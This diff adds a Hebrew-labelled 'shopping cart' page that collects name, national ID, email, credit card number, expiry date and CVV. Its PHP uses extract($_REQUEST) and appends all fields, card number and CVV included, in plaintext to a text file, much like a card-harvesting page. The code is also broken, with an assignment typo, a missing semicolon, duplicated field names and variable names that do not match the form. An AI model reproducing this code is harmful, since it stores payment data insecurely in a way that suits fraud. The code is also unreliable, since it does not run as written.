@@ -1,0 +1,89 @@
+<html>
+<head>
+	<link rel="stylesheet" type="text/css" href="login.css">
+	
+
+<!-- jQuery library -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+<!-- Popper JS -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+
+<!-- Latest compiled JavaScript -->
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+</head>
+<body>
+	<form action="login.php" method="post">
+		<h1> סל קניות </h1>
+		<label> : שם פרטי  </label>
+			<input style="text-align:right" id="given-name" name="given-name" type="text"  required autofocus>
+		<label> : שם משפחה  </label>
+			<input style="text-align:right" id="given-name" name="given-name" type="text"  required autofocus>
+		<label>: תעודת זהות </label>
+			<input style="text-align:right" id="ID" name="ID" type="text" required autofocus>
+		<label class="input_box">: דואר אלקטרוני </label>
+                <input style="text-align:right" type="email" name="email" />
+         <label class="input_box"> : מספר כרטיס אשראי </label>
+			<input style="text-align:right" type="text" name="Visanumber" value="" maxlength="16">
+		<label class="input_box"> : בתוקף עד </label>
+			<input style="text-align:right" type="date" name="bday" />
+		<label class="input_box"> : קוד אימות </label>		
+			<input style="text-align:right" type="text" name="address" value=""  maxlength="3">
+
+<button type="submit" value="LogIn" >אישור</button>
+
+
+
+<div class="container1">
+		
+			<button class="btn btn-success" data-target="#mymodel" data-toggle="model" >הצגת קבלה </button>
+			
+			</div>
+			
+			<div class="model" id="mymodel">
+				<div class="model-dialog">
+					<div class="model-content">
+						
+						<div class="model-header">
+							<h3 class="text-center text-primary"> קבלה </h3>
+						
+							
+						
+						</div>
+					
+					
+			
+					</div>
+				</div>
+			</div>
+
+
+</form>
+	
+	
+	
+</body>
+</html>
+<?php 
+	 
+	extract($_REQUEST)
+	$file-fopen("pay_data.txt","a");
+	
+	fwrite($file,"First name :");
+	fwrite($file, $Firstname ."\n");
+	fwrite($file,"Last name :");
+	fwrite($file,$Lastname ."\n");
+	fwrite($file,"Id :");
+	fwrite($file,$Id ."\n");
+	fwrite($file,"Email :");
+	fwrite($file,$Email ."\n");
+	fwrite($file,"Visa number :");
+	fwrite($file,$Visanumber ."\n");
+	fwrite($file,"Validity :");
+	fwrite($file,$Validity ."\n");
+	fwrite($file,"CVV :");
+	fwrite($file,$CVV ."\n");
+	fclose($file);
+	
+?>
